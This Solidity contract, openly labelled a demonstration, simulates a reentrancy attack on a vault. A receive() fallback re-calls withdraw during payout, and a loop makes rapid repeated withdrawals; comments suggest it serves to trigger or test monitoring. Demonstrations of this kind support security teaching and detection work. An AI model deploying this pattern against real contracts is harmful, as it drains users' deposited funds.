// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

/**
 * @title MaliciousAttacker
 * @notice Demo contract simulating reentrancy attack
 * @dev FOR DEMONSTRATION PURPOSES ONLY
 */
contract MaliciousAttacker {
    address public targetVault;
    uint256 public attackCount;
    
    event AttackAttempt(uint256 count, uint256 timestamp);
    
    constructor(address _targetVault) {
        targetVault = _targetVault;
    }
    
    // Simulate reentrancy attack
    function attack() external payable {
        require(msg.value > 0, "Need funds to attack");
        
        // Deposit to vault
        (bool success, ) = targetVault.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Deposit failed");
        
        // Attempt immediate withdrawal (suspicious pattern)
        (success, ) = targetVault.call(
            abi.encodeWithSignature("withdraw(uint256)", msg.value)
        );
        
        emit AttackAttempt(++attackCount, block.timestamp);
    }
    
    // Simulate rapid withdrawals
    function rapidWithdraw() external {
        for(uint i = 0; i < 3; i++) {
            (bool success, ) = targetVault.call(
                abi.encodeWithSignature("withdraw(uint256)", 0.01 ether)
            );
            if (!success) break;
        }
        emit AttackAttempt(++attackCount, block.timestamp);
    }
    
    receive() external payable {
        // Reentrancy attempt
        if (attackCount < 2) {
            attackCount++;
            (bool success, ) = targetVault.call(
                abi.encodeWithSignature("withdraw(uint256)", 0.01 ether)
            );
            if (success) {
                emit AttackAttempt(attackCount, block.timestamp);
            }
        }
    }
}